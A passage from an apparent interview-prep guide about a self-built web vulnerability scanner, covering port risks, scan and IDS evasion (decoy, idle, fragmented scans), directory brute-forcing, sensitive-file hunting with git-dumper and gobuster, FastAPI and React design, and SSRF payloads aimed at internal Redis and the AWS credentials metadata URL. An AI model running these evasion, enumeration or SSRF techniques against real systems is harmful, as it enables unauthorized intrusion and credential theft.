| **443** | HTTPS | TCP | SSL/TLS vulnerabilities |
| **445** | SMB | TCP | EternalBlue (MS17-010) |
| **3306** | MySQL | TCP | Default credentials, SQLi |
| **3389** | RDP | TCP | BlueKeep (CVE-2019-0708), brute force |
| **5432** | PostgreSQL | TCP | Default credentials |
| **6379** | Redis | TCP | No auth by default, RCE |
| **8080** | HTTP Alt | TCP | Admin panels |
| **27017** | MongoDB | TCP | No auth by default |

---

**Evasion Techniques:**

**1. Timing/Rate Limiting**

```python
# Slow scan to avoid IDS detection
for port in ports:
    scan_port(port)
    await asyncio.sleep(random.uniform(0.5, 2.0))  # Random delay
```

**2. Fragmentation**

```python
# Scapy - split packets into fragments
send(fragment(IP(dst=target)/TCP(dport=80)/Raw(load="GET / HTTP/1.0\\r\\n\\r\\n")))
```

IDS may not reassemble fragments correctly.

**3. Decoy Scanning**

```bash
# Nmap
nmap -D RND:10 target.com
# Sends scans from 10 random spoofed IPs + your real IP
# Target sees traffic from 11 IPs, can't distinguish attacker
```

**4. Idle Scan (Zombie Scan)**

```bash
nmap -sI zombie.com:port target.com
# Uses third-party "zombie" to scan target
# Target sees zombie's IP, not yours
```

**5. Port Randomization**

```python
# Don't scan sequentially (1, 2, 3...)
import random
ports_shuffled = random.sample(ports, len(ports))
for port in ports_shuffled:
    scan_port(port)
```

**6. Protocol Headers**

```python
# Change User-Agent, TTL to avoid fingerprinting
sr1(IP(dst=target, ttl=64)/TCP(dport=80))  # Linux TTL
sr1(IP(dst=target, ttl=128)/TCP(dport=80))  # Windows TTL
```

**7. Proxy Chains**

```bash
# Route through multiple proxies
proxychains nmap -sT target.com
```

---

**Firewall Detection:**

```python
def is_filtered(response):
    if response is None:
        return "filtered"  # No response = firewall drop
    if response.haslayer(ICMP):
        if response[ICMP].type == 3:  # Destination Unreachable
            if response[ICMP].code == 13:  # Admin Prohibited
                return "filtered"
    return "open/closed"
```

---

## 6. Directory Enumeration

### Q6.1: Explain directory brute-forcing. What are effective wordlists and techniques?

**Answer:**

**Directory Enumeration**: Discovering hidden files/directories by testing common paths.

**Why Important:**
- Find admin panels (`/admin`, `/wp-admin`)
- Backup files (`backup.zip`, `db.sql`)
- Config files (`.env`, `config.php`)
- Debug endpoints (`/debug`, `/test`)

---

**Our Scanner (`dirscan.py`):**

```python
COMMON_DIRS = [
    'admin', 'administrator', 'login', 'wp-admin',
    'phpmyadmin', 'cpanel', 'dashboard', 'portal',
    'backup', 'backups', 'db', 'database',
    'config', 'conf', 'configuration',
    'test', 'testing', 'dev', 'development',
    '.git', '.svn', '.env', '.htaccess',
    'api', 'v1', 'v2', 'graphql',
    'uploads', 'files', 'images', 'assets',
]

def scan_directory(base_url, directory):
    url = f"{base_url}/{directory}"
    try:
        response = requests.get(url, timeout=5, allow_redirects=False)
        
        if response.status_code == 200:
            return {'path': directory, 'status': 200, 'size': len(response.content)}
        elif response.status_code == 403:
            return {'path': directory, 'status': 403, 'note': 'Forbidden (exists but protected)'}
        elif response.status_code == 401:
            return {'path': directory, 'status': 401, 'note': 'Requires authentication'}
        elif response.status_code in [301, 302, 307, 308]:
            return {'path': directory, 'status': response.status_code, 'redirect': response.headers.get('Location')}
    except:
        return None
```

**Status Code Meanings:**
- **200 OK**: Directory exists and accessible
- **403 Forbidden**: Exists but protected (still valuable intel)
- **404 Not Found**: Doesn't exist
- **301/302**: Redirect (follow to see destination)
- **401 Unauthorized**: Requires authentication

---

**Advanced Wordlists:**

**1. SecLists (industry standard)**
```bash
git clone https://github.com/danielmiessler/SecLists.git

# Top lists:
SecLists/Discovery/Web-Content/common.txt (4k entries)
SecLists/Discovery/Web-Content/big.txt (20k entries)
SecLists/Discovery/Web-Content/raft-large-directories.txt (62k)
```

**2. Technology-Specific**
```
# WordPress
wp-admin, wp-content, wp-includes, xmlrpc.php

# Django
admin/, __debug__/, static/, media/

# Laravel
artisan, .env, storage/, bootstrap/cache/
```

**3. Generate Custom Wordlist**

```python
import itertools

# Combine words
bases = ['admin', 'user', 'api']
suffixes = ['', 'panel', 'login', 'dashboard']
versions = ['', 'v1', 'v2', '2023', '2024']

wordlist = set()
for combo in itertools.product(bases, suffixes, versions):
    path = '-'.join(filter(None, combo))  # Remove empty strings
    wordlist.add(path)

# Output: admin, admin-panel, admin-v1, admin-panel-v1, etc.
```

**4. Recursive Scanning**

```python
async def recursive_scan(base_url, path="", depth=0, max_depth=2):
    if depth > max_depth:
        return
    
    found = []
    for directory in COMMON_DIRS:
        full_path = f"{path}/{directory}" if path else directory
        url = f"{base_url}/{full_path}"
        
        response = requests.get(url)
        if response.status_code == 200:
            found.append(full_path)
            # Recurse into found directory
            await recursive_scan(base_url, full_path, depth + 1, max_depth)
    
    return found
```

**Example:**
```
Found: /api
  Scanning /api/admin
    Found: /api/admin/users
  Scanning /api/v1
    Found: /api/v1/debug
```

---

**Evasion & Optimization:**

**1. Threading**

```python
from concurrent.futures import ThreadPoolExecutor

with ThreadPoolExecutor(max_workers=10) as executor:
    results = executor.map(lambda d: scan_directory(base_url, d), directories)
```

**2. Rate Limiting**

```python
import time
time.sleep(0.1)  # 100ms delay between requests
```

**3. Custom Headers**

```python
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml',
    'Accept-Language': 'en-US,en;q=0.9',
    'Referer': base_url,
}
response = requests.get(url, headers=headers)
```

**4. Response Differentiation**

```python
# Websites may return 200 for all requests (custom 404)
baseline_response = requests.get(f"{base_url}/thispathdoesnotexist12345")
baseline_length = len(baseline_response.content)

# Compare
if abs(len(response.content) - baseline_length) > 100:
    # Significant difference = likely real page
    return True
```

**5. Filter False Positives**

```python
# Ignore default error pages
false_positive_titles = [
    "404 Not Found",
    "Page Not Found",
    "Error",
    "Default Web Site Page",
]

soup = BeautifulSoup(response.content, 'html.parser')
title = soup.find('title')
if title and any(fp in title.text for fp in false_positive_titles):
    return False  # Likely false positive
```

---

### Q6.2: What sensitive files should you look for during enumeration?

**Answer:**

**Critical Files:**

**1. Configuration Files**
```
.env                  # Environment variables (DB credentials, API keys)
config.php           # PHP configuration
web.config           # ASP.NET configuration
application.properties  # Java/Spring config
settings.py          # Django settings
wp-config.php        # WordPress (DB credentials)
database.yml         # Rails database config
```

**Example .env leakage:**
```bash
DB_HOST=localhost
DB_USER=admin
DB_PASS=SuperSecret123!
AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

**2. Backup Files**
```
backup.zip
backup.sql
db.sql
dump.sql
site-backup.tar.gz
www-backup.tar
old.tar.gz
```

**3. Version Control**
```
.git/
.git/config         # May contain repo URL with creds
.svn/
.hg/
```

**Exploiting .git:**
```bash
# Clone exposed .git
git-dumper http://target.com/.git ./output

# View history
cd output
git log
git show <commit>  # View old commits (may contain secrets)
```

**4. Log Files**
```
error.log
access.log
debug.log
application.log
/var/log/apache2/access.log
/var/log/nginx/error.log
```

**5. Development/Debug Files**
```
phpinfo.php          # Shows PHP config, environment vars
info.php
test.php
debug.php
_profiler/           # Symfony profiler (shows queries, env)
```

**6. Admin Interfaces**
```
/admin
/administrator
/wp-admin
/phpmyadmin
/cpanel
/plesk
/webmin
```

**7. API Documentation**
```
/api-docs
/swagger
/swagger-ui
/graphql
/graphiql
/docs
/redoc
```

**8. Sensitive Directories**
```
/uploads         # User-uploaded files (may contain webshells)
/temp
/tmp
/cache
/backup
/db
```

---

**Automated Tools:**

**1. Gobuster** (fast, Go-based)
```bash
gobuster dir -u https://target.com -w common.txt -t 50 -x php,txt,zip
# -x: File extensions to append
# -t: Threads
```

**2. FFUF** (flexible, fast)
```bash
ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,403,301 -fc 404
# -mc: Match status codes
# -fc: Filter status codes
```

**3. Dirsearch** (Python, smart recursion)
```bash
dirsearch -u https://target.com -e php,html,js,zip -x 404,403
```

**4. Feroxbuster** (Rust, recursive)
```bash
feroxbuster -u https://target.com -w wordlist.txt --depth 2 --threads 50
```

---

## 7. Architecture & Design Decisions

### Q7.1: Why did you choose FastAPI over Flask/Django for the backend?

**Answer:**

**FastAPI Advantages:**

**1. Performance**
- **ASGI-based** (async/await support)
- Comparable to Node.js and Go
- **3-4x faster than Flask** (synchronous)

**Benchmark (requests/sec):**
```
FastAPI (Uvicorn):   ~20,000 req/s
Flask (Gunicorn):    ~6,000 req/s
Django:              ~5,000 req/s
```

**Critical for our scanner**: Concurrent port scanning, multiple HTTP requests simultaneously.

**2. Async/Await Native**

```python
# FastAPI
@app.post("/scan")
async def scan_target(request: ScanRequest):
    # Can await async functions naturally
    port_results = await port_scanner.scan()
    return results
```

vs Flask (requires greenlets/eventlet):
```python
# Flask needs monkey patching
from gevent import monkey
monkey.patch_all()
```

**3. Automatic API Documentation**

FastAPI auto-generates:
- **Swagger UI** at `/docs`
- **ReDoc** at `/redoc`

```python
@app.post("/scan", summary="Scan target for vulnerabilities")
async def scan_target(
    request: ScanRequest,
    background_tasks: BackgroundTasks
):
    \"\"\"
    Performs comprehensive security scan:
    - SQL Injection
    - XSS
    - Security Headers
    - Port Scan
    - Directory Enumeration
    \"\"\"
    return results
```

**4. Type Safety with Pydantic**

```python
class ScanRequest(BaseModel):
    url: HttpUrl  # Automatic validation
    depth: int = Field(default=1, ge=1, le=5)  # Min/max constraints
    
    @field_validator('url')
    @classmethod
    def validate_url(cls, v):
        if not v.startswith(('http://', 'https://')):
            raise ValueError('Invalid URL')
        return v
```

**Benefits:**
- Runtime validation
- Auto-generated JSON schema
- IDE autocomplete
- Reduces bugs

**5. Dependency Injection**

```python
from fastapi import Depends

def get_current_user(token: str = Depends(oauth2_scheme)):
    # Decode JWT, verify user
    return user

@app.get("/profile")
async def profile(user: User = Depends(get_current_user)):
    return user
```

Cleaner than Flask's `g` object or Django's middleware.

**6. WebSocket Support**

```python
@app.websocket("/ws/scan/{scan_id}")
async def websocket_scan_progress(websocket: WebSocket, scan_id: str):
    await websocket.accept()
    while scanning:
        await websocket.send_json({"progress": percent})
        await asyncio.sleep(0.5)
```

**Native WebSocket** for real-time progress updates.

---

**When to Choose Alternatives:**

**Flask**: Small projects, simpler API, extensive plugin ecosystem

**Django**: Full-stack monolith, admin panel, ORM, auth built-in

**FastAPI**: Modern async APIs, microservices, high performance

---

### Q7.2: Explain your security scanner's architecture. Why concurrent execution?

**Answer:**

**Architecture Overview:**

```
┌─────────────────────────────────────────────────┐
│              React Frontend                     │
│  (Vite, Tailwind, Axios, WebSocket)            │
└─────────────────┬───────────────────────────────┘
                  │ HTTP/WebSocket
┌─────────────────▼───────────────────────────────┐
│           FastAPI Backend                       │
│  ┌──────────────────────────────────────────┐  │
│  │  API Endpoints                            │  │
│  │  POST /scan  GET /history  WS /ws/scan   │  │
│  └──────────────┬───────────────────────────┘  │
│                 │                                │
│  ┌──────────────▼───────────────────────────┐  │
│  │  Orchestration Layer (main.py)           │  │
│  │  - SSRF validation                        │  │
│  │  - ThreadPoolExecutor                     │  │
│  │  - Progress tracking                      │  │
│  └──────────────┬───────────────────────────┘  │
│                 │                                │
│  ┌──────────────▼───────────────────────────┐  │
│  │  Scanner Modules                          │  │
│  │  ┌────────────────────────────────────┐  │  │
│  │  │ crawler.py    - BeautifulSoup      │  │  │
│  │  │ sqli.py       - Payload injection   │  │  │
│  │  │ xss.py        - Script reflection   │  │  │
│  │  │ headers.py    - HTTP header check   │  │  │
│  │  │ portscan.py   - Async TCP connect   │  │  │
│  │  │ dirscan.py    - Path enumeration    │  │  │
│  │  └────────────────────────────────────┘  │  │
│  └──────────────┬───────────────────────────┘  │
│                 │                                │
│  ┌──────────────▼───────────────────────────┐  │
│  │  Report Generator                          │  │
│  │  - Risk scoring                            │  │
│  │  - Recommendations                         │  │
│  └────────────────────────────────────────────┘  │
│  ┌────────────────────────────────────────────┐  │
│  │  Storage Layer                             │  │
│  │  - SQLite (scan_history.db)               │  │
│  │  - PDF Generator (reportlab)              │  │
│  └────────────────────────────────────────────┘  │
└───────────────────────────────────────────────────┘
```

---

**Concurrent Execution Strategy:**

**Phase 1: Sequential (Crawler)**
```python
# Must run first to discover forms/links
crawler_result = crawler.crawl()
```

**Why**: SQLi and XSS scanners need forms/links from crawler.

**Phase 2: Concurrent (All other scans)**
```python
from concurrent.futures import ThreadPoolExecutor, as_completed

def run_sqli():
    return sqli_scanner.scan(forms, links)

def run_xss():
    return xss_scanner.scan(forms, links)

with ThreadPoolExecutor(max_workers=5) as executor:
    futures = {
        executor.submit(run_sqli): 'sqli',
        executor.submit(run_xss): 'xss',
        executor.submit(header_scanner.scan): 'headers',
        executor.submit(port_scanner.scan): 'ports',
        executor.submit(dir_scanner.scan): 'dirs',
    }
    
    for future in as_completed(futures):
        scan_type = futures[future]
        results[scan_type] = future.result()
```

**Why Concurrent:**

**Sequential Timing:**
```
Crawler:    10s
SQLi:       15s
XSS:        15s
Headers:    2s
Ports:      3s
Dirs:       20s
────────────────
Total:      65s
```

**Concurrent Timing:**
```
Crawler:    10s
────────────────
Parallel:
  SQLi:     15s
  XSS:      15s  │
  Headers:  2s   │  All run
  Ports:    3s   │  simultaneously
  Dirs:     20s  │  (max = 20s)
────────────────
Total:      30s (2× faster)
```

---

**Thread Pool vs Async:**

**ThreadPoolExecutor**: For I/O-bound blocking operations
```python
# Blocking HTTP requests (requests library)
response = requests.get(url)  # Blocks thread
```

**AsyncIO**: For async/await compatible operations
```python
# async port scanner
async def scan_port(port):
    reader, writer = await asyncio.open_connection(host, port)
```

**Our Approach:**
- **ThreadPool**: Manages SQLi, XSS, Headers, Dirs (use `requests`)
- **AsyncIO**: Within Port Scanner (native async sockets)

---

**Progress Tracking (WebSocket):**

```python
# Global progress dict
scan_progress: Dict[str, Dict] = {}

@app.websocket("/ws/scan/{scan_id}")
async def websocket_scan_progress(websocket: WebSocket, scan_id: str):
    await websocket.accept()
    while True:
        if scan_id in scan_progress:
            await websocket.send_json(scan_progress[scan_id])
        await asyncio.sleep(0.5)

# Update from scan
scan_progress[scan_id] = {
    "overall_percent": 45,
    "current_step": "sqli",
    "steps": {
        "crawling": {"status": "completed"},
        "sqli": {"status": "in_progress"},
        ...
    }
}
```

**Frontend:**
```javascript
const ws = new WebSocket(`ws://localhost:8000/ws/scan/${scanId}`)
ws.onmessage = (event) => {
    const progress = JSON.parse(event.data)
    updateProgressBar(progress.overall_percent)
}
```

---

## 8. Python & FastAPI Implementation

### Q8.1: Explain Pydantic models and validation in your project

**Answer:**

**Pydantic**: Data validation using Python type annotations.

**Our Models (`models.py`):**

```python
from pydantic import BaseModel, HttpUrl, field_validator, Field
from typing import List, Dict, Optional

class ScanRequest(BaseModel):
    \"\"\"Request model for initiating scan\"\"\"
    url: str
    scan_id: Optional[str] = None
    
    @field_validator('url')
    @classmethod
    def validate_url(cls, v: str) -> str:
        if not v.startswith(('http://', 'https://')):
            raise ValueError('URL must start with http:// or https://')
        return v.rstrip('/')

class VulnerabilityDetail(BaseModel):
    type: str
    payload: Optional[str] = None
    location: Optional[str] = None
    evidence: Optional[str] = None

class SQLInjectionResult(BaseModel):
    vulnerable: bool
    details: List[VulnerabilityDetail] = []
    tested_payloads: int = 0

class ScanResponse(BaseModel):
    target_url: str
    scan_timestamp: str
    scan_duration: float
    risk_level: str  # CRITICAL, HIGH, MEDIUM, LOW
    risk_score: int = Field(ge=0, le=100)  # 0-100
    sql_injection: SQLInjectionResult
    xss: 'XSSResult'
    headers: 'HeaderResult'
    open_ports: List[Dict]
    recommendations: List[str]
```

**Built-in Validators:**

```python
from pydantic import EmailStr, HttpUrl, constr, conint

class User(BaseModel):
    email: EmailStr  # Validates email format
    website: HttpUrl  # Validates URL
    username: constr(min_length=3, max_length=20)  # Constrained string
    age: conint(ge=0, le=120)  # Constrained int (0-120)
```

**Custom Validators:**

```python
from pydantic import field_validator
import re

class ScanRequest(BaseModel):
    url: str
    
    @field_validator('url')
    @classmethod
    def validate_no_local_urls(cls, v):
        # Block localhost, 127.0.0.1, private IPs
        parsed = urlparse(v)
        
        if parsed.hostname in ['localhost', '127.0.0.1', '0.0.0.0']:
            raise ValueError('Localhost URLs not allowed')
        
        # Block private IP ranges
        try:
            ip = ipaddress.ip_address(parsed.hostname)
            if ip.is_private:
                raise ValueError('Private IP addresses not allowed')
        except ValueError:
            pass  # Not an IP (domain name)
        
        return v
```

**Validation in Action:**

```python
# Valid request
request = ScanRequest(url="https://example.com")

# Invalid - raises ValidationError
try:
    request = ScanRequest(url="not-a-url")
except ValidationError as e:
    print(e.json())
    # {
    #   "url": [{
    #     "msg": "URL must start with http:// or https://",
    #     "type": "value_error"
    #   }]
    # }
```

**FastAPI Integration:**

```python
@app.post("/scan", response_model=ScanResponse)
async def scan_target(request: ScanRequest):
    # FastAPI automatically:
    # 1. Parses JSON body
    # 2. Validates against ScanRequest model
    # 3. Returns 422 if validation fails
    # 4. Provides 'request' as validated object
    
    return ScanResponse(...)  # Also validated on response
```

**Benefits:**
- Type safety
- Automatic validation
- JSON schema generation
- IDE autocomplete
- Documentation

---

### Q8.2: How do you handle errors and exceptions securely?

**Answer:**

**Error Handling Strategy:**

**1. Custom Exception Classes**

```python
# exceptions.py
class ScannerException(Exception):
    \"\"\"Base exception for scanner\"\"\"
    pass

class SSRFException(ScannerException):
    \"\"\"SSRF attempt detected\"\"\"
    pass

class RateLimitException(ScannerException):
    \"\"\"Rate limit exceeded\"\"\"
    pass

class ScanTimeoutException(ScannerException):
    \"\"\"Scan exceeded timeout\"\"\"
    pass
```

**2. FastAPI Exception Handlers**

```python
from fastapi import HTTPException, Request, status
from fastapi.responses import JSONResponse

@app.exception_handler(SSRFException)
async def ssrf_exception_handler(request: Request, exc: SSRFException):
    # Log the attempt
    logger.warning(f"SSRF attempt: {request.url} - {exc}")
    
    # Return safe error (don't reveal internals)
    return JSONResponse(
        status_code=status.HTTP_400_BAD_REQUEST,
        content={
            "error": "Invalid URL",
            "message": "The provided URL is not allowed"
        }
    )

@app.exception_handler(Exception)
async def global_exception_handler(request: Request, exc: Exception):
    # Log full error internally
    logger.error(f"Unhandled exception: {exc}", exc_info=True)
    
    # Return generic error (don't leak stack traces)
    return JSONResponse(
        status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
        content={
            "error": "Internal server error",
            "message": "An unexpected error occurred"
        }
    )
```

**3. Secure Logging**

```python
import logging
from logging.handlers import RotatingFileHandler

# Configure logger
logger = logging.getLogger("scanner")
logger.setLevel(logging.INFO)

# File handler with rotation
file_handler = RotatingFileHandler(
    "scanner.log",
    maxBytes=10*1024*1024,  # 10 MB
    backupCount=5
)

# Format - include timestamp, level, message
formatter = logging.Formatter(
    '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
file_handler.setFormatter(formatter)
logger.addHandler(file_handler)

# Usage
logger.info(f"Scan started: {target_url}")
logger.warning(f"Suspicious payload detected: {payload}")
logger.error(f"Scan failed: {error}", exc_info=True)  # Include traceback
```

**Security Considerations:**
```python
# DON'T log sensitive data
logger.info(f"User logged in: {username}, password: {password}")  # ❌

# DO log sanitized data
logger.info(f"User logged in: {username}")  # ✅

# DON'T expose stack traces to user
return {"error": str(exception)}  # ❌

# DO log internally, return generic message
logger.error(f"Error: {exception}", exc_info=True)
return {"error": "An error occurred"}  # ✅
```

**4. Validation Error Handling**

```python
from fastapi.exceptions import RequestValidationError
from pydantic import ValidationError

@app.exception_handler(RequestValidationError)
async def validation_exception_handler(request: Request, exc: RequestValidationError):
    # Log validation errors
    logger.warning(f"Validation error: {exc.errors()}")
    
    # Return user-friendly error
    errors = []
    for error in exc.errors():
        field = error['loc'][-1]  # Get field name
        msg = error['msg']
        errors.append(f"{field}: {msg}")
    
    return JSONResponse(
        status_code=status.HTTP_422_UNPROCESSABLE_ENTITY,
        content={
            "error": "Validation failed",
            "details": errors
        }
    )
```

**5. Timeout Handling**

```python
import asyncio

@app.post("/scan")
async def scan_target(request: ScanRequest):
    try:
        # Set overall timeout for scan
        result = await asyncio.wait_for(
            perform_scan(request.url),
            timeout=120.0  # 2 minutes
        )
        return result
    except asyncio.TimeoutError:
        raise HTTPException(
            status_code=status.HTTP_408_REQUEST_TIMEOUT,
            detail="Scan exceeded time limit"
        )
```

**6. Graceful Degradation**

```python
async def scan_target(url):
    results = {}
    
    # Try each scan module independently
    try:
        results['sqli'] = sqli_scanner.scan(url)
    except Exception as e:
        logger.error(f"SQLi scan failed: {e}")
        results['sqli'] = {"error": "Scan failed", "vulnerable": False}
    
    try:
        results['xss'] = xss_scanner.scan(url)
    except Exception as e:
        logger.error(f"XSS scan failed: {e}")
        results['xss'] = {"error": "Scan failed", "vulnerable": False}
    
    # Return partial results
    return results
```

**7. Rate Limiting**

```python
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

@app.post("/scan")
@limiter.limit("10/minute")  # Max 10 scans per minute per IP
async def scan_target(request: Request, scan_request: ScanRequest):
    return await perform_scan(scan_request.url)
```

---

## 9. React & Frontend Security

### Q9.1: How does React prevent XSS? When is dangerouslySetInnerHTML necessary?

**Answer:**

**React's XSS Protection:**

**1. Automatic Escaping**

```jsx
function Welcome({ username }) {
    // Malicious input
    const name = "<script>alert('XSS')</script>";
    
    // React automatically escapes
    return <h1>Hello {name}</h1>;
    
    // Rendered as:
    // <h1>Hello &lt;script&gt;alert('XSS')&lt;/script&gt;</h1>
    // Script doesn't execute
}
```

**Under the hood:**
```javascript
// React's escapeHtml function
function escapeHtml(string) {
    const escaped = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#x27;',
    };
    return String(string).replace(/[&<>"']/g, (char) => escaped[char]);
}
```

**2. JSX Expressions**

```jsx
// Safe - always escaped
<div>{userInput}</div>
<img src={userProvidedUrl} />
<a href={userLink}>Link</a>
```

**3. Attribute Sanitization**

```jsx
// React blocks javascript: protocol
<a href="javascript:alert(1)">Click</a>
// Becomes: <a href="about:blank">Click</a>
```

---

**dangerouslySetInnerHTML Use Cases:**

**When to use:**
- Rendering HTML from trusted sources (CMS, markdown)
- Rich text editors
- Legacy HTML content

**Example: Markdown to HTML**

```jsx
import DOMPurify from 'dompurify';
import marked from 'marked';

function MarkdownRenderer({ markdown }) {
    // 1. Convert markdown to HTML
    const rawHTML = marked(markdown);
    
    // 2. Sanitize HTML
    const cleanHTML = DOMPurify.sanitize(rawHTML);
    
    // 3. Render safely
    return <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />;
}
```

**DOMPurify Configuration:**

```javascript
import DOMPurify from 'dompurify';

// Strict mode - only safe tags
const config = {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href', 'title'],
};

const clean = DOMPurify.sanitize(dirty, config);

// Allow more (use cautiously)
const clean = DOMPurify.sanitize(dirty, {
    ADD_TAGS: ['iframe'],  // Allow iframes
    ADD_ATTR: ['target'],  // Allow target attribute
});
```

**Never Do This:**

```jsx
// ❌ VULNERABLE
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// ❌ VULNERABLE
<div dangerouslySetInnerHTML={{ __html: props.content }} />

// ✅ SAFE
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />
```

---

**Other XSS Vectors in React:**

**1. User-Controlled Attributes**

```jsx
// Safe - React escapes
<img src={userUrl} />

// Dangerous if user controls entire tag
const Tag = userControlledTag;  // Could be 'script'
<Tag>Content</Tag>  // ❌ XSS

// Safe alternative
const allowedTags = ['div', 'span', 'p'];
const Tag = allowedTags.includes(userTag) ? userTag : 'div';
<Tag>Content</Tag>  // ✅ Safe
```

**2. Event Handlers**

```jsx
// Safe - React escapes
<button onClick={() => alert(userInput)}>Click</button>

// Dangerous - eval-like behavior
<button onClick={new Function(userInput)}>Click</button>  // ❌
```

**3. Server-Side Rendering (SSR)**

```jsx
// Next.js - getServerSideProps
export async function getServerSideProps() {
    const data = await fetchUserData();
    
    // ❌ Don't expose raw data
    return { props: { __dangerousHtml: data.html } };
    
    // ✅ Sanitize first
    return { props: { html: DOMPurify.sanitize(data.html) } };
}
```

---

### Q9.2: Explain your frontend architecture and state management

**Answer:**

**Architecture:**

```
src/
├── App.jsx                 # Root component, routing logic
├── main.jsx                # Entry point, React rendering
├── index.css               # Global styles, Tailwind directives
├── config/
│   └── api.js              # API URL configuration
├── pages/
│   ├── Home.jsx            # Scan input page
│   ├── Results.jsx         # Scan results display
│   └── History.jsx         # Scan history management
├── components/
│   ├── ScanForm.jsx        # Input form
│   ├── ScanProgressBar.jsx # Real-time progress
│   ├── VulnerabilityCard.jsx   # Vuln summary card
│   ├── RiskBadge.jsx       # Risk level badge
│   ├── HeadersTable.jsx    # Security headers table
│   ├── PortsTable.jsx      # Open ports table
│   ├── DirectoriesTable.jsx    # Found directories
│   ├── ExportPDFButton.jsx # PDF export
│   └── RecommendationsCard.jsx # Security advice
└── utils/
    └── severityColors.js   # Color scheme for severity levels
```

---

**State Management (Props Drilling):**

**App.jsx (Parent State):**

```jsx
import { useState } from 'react';

function App() {
    // Global state
    const [currentPage, setCurrentPage] = useState('home');
    const [scanResults, setScanResults] = useState(null);
    const [isLoading, setIsLoading] = useState(false);
    const [error, setError] = useState(null);
    
    // Handlers passed to children
    const handleScanComplete = (results) => {
        setScanResults(results);
        setIsLoading(false);
        setCurrentPage('results');
    };
    
    const handleScanStart = () => {
        setIsLoading(true);
        setError(null);
    };
    
    // Render based on state
    return (
        <div>
            {currentPage === 'home' && (
                <Home 
                    onScanComplete={handleScanComplete}
                    onScanStart={handleScanStart}
                    isLoading={isLoading}
                />
            )}
            {currentPage === 'results' && (
                <Results 
                    results={scanResults}
                    onReset={() => setCurrentPage('home')}
                />
            )}
        </div>
    );
}
```

**Why Not Context/Redux:**
- **Simple State**: Only 1-2 levels of nesting
- **Few Components**: ~15 components
- **No Complex Logic**: No need for middleware, actions, reducers
- **Performance**: Props drilling is fast for small apps

**When to use Context:**

```jsx
// If we had 5+ levels of nesting
<App>
  <Layout>
    <Sidebar>
      <Menu>
        <MenuItem>
          <Button />  // Needs theme from App
        </MenuItem>
      </Menu>
    </Sidebar>
  </Layout>
</App>

// Context solution
const ThemeContext = createContext();

function App() {
    const [theme, setTheme] = useState('dark');
    return (
        <ThemeContext.Provider value={{ theme, setTheme }}>
            <Layout />
        </ThemeContext.Provider>
    );
}

function Button() {
    const { theme } = useContext(ThemeContext);  // Access directly
}
```

---

**API Calls with Axios:**

```jsx
// config/api.js
const API_URL = import.meta.env.VITE_API_URL || 'http://localhost:8000';
export default API_URL;

// pages/Home.jsx
import axios from 'axios';
import API_URL from '../config/api';

async function handleScan(url) {
    try {
        onScanStart();
        
        const response = await axios.post(`${API_URL}/scan`, {
            url: url,
            scan_id: `scan_${Date.now()}`
        }, {
            timeout: 180000,  // 3 minutes
            headers: {
                'Content-Type': 'application/json'
            }
        });
        
        onScanComplete(response.data);
    } catch (error) {
        if (error.response) {
            // Server error (4xx, 5xx)
            onError(error.response.data.detail || 'Scan failed');
        } else if (error.request) {
            // No response from server
            onError('Cannot connect to server');
        } else {
            // Request setup error
            onError(error.message);
        }
    }
}
```

---

**WebSocket for Real-Time Progress:**

```jsx
// components/ScanProgressBar.jsx
import { useEffect, useState } from 'react';

function ScanProgressBar({ scanId }) {
    const [progress, setProgress] = useState(0);
    
    useEffect(() => {
        // Connect to WebSocket
        const ws = new WebSocket(`ws://localhost:8000/ws/scan/${scanId}`);
        
        ws.onopen = () => {
            console.log('Progress WebSocket connected');
        };
        
        ws.onmessage = (event) => {
            const data = JSON.parse(event.data);
            setProgress(data.overall_percent);
        };
        
        ws.onerror = (error) => {
            console.error('WebSocket error:', error);
            // Fallback to polling
            startPolling();
        };
        
        ws.onclose = () => {
            console.log('Progress WebSocket closed');
        };
        
        // Cleanup
        return () => {
            ws.close();
        };
    }, [scanId]);
    
    return (
        <div className="progress-bar">
            <div style={{ width: `${progress}%` }} />
        </div>
    );
}
```

---

**Component Composition:**

```jsx
// Results.jsx
function Results({ results, onReset }) {
    return (
        <div>
            <Header>
                <RiskBadge level={results.risk_level} score={results.risk_score} />
                <ExportPDFButton scanData={results} />
            </Header>
            
            <VulnerabilityGrid>
                <VulnerabilityCard
                    title="SQL Injection"
                    vulnerable={results.sql_injection.vulnerable}
                    severity="critical"
                />
                <VulnerabilityCard
                    title="XSS"
                    vulnerable={results.xss.vulnerable}
                    severity="high"
                />
            </VulnerabilityGrid>
            
            <DetailsSection>
                <HeadersTable headers={results.headers} />
                <PortsTable ports={results.open_ports} />
                <DirectoriesTable dirs={results.directories} />
            </DetailsSection>
            
            <RecommendationsCard recommendations={results.recommendations} />
        </div>
    );
}
```

**Benefits:**
- **Reusable Components**: VulnerabilityCard used multiple times
- **Single Responsibility**: Each component has one job
- **Easy Testing**: Test components in isolation

---

## 10. Advanced Topics

### Q10.1: Explain SSRF prevention in your scanner. Why is it critical?

**Answer:**

**SSRF (Server-Side Request Forgery):** Attacker tricks server into making requests to unintended locations.

**Attack Scenario:**

```python
# Vulnerable code
@app.post("/scan")
def scan(url: str):
    response = requests.get(url)  # No validation
    return response.text
```

**Attack:**
```
POST /scan
{
    "url": "http://127.0.0.1:6379"  # Internal Redis
}

or

{
    "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"  # AWS metadata
}
```

**Impact:**
- Access internal services (databases, admin panels)
- Read cloud metadata (AWS credentials)
- Port scanning internal network
- DOS internal services

---

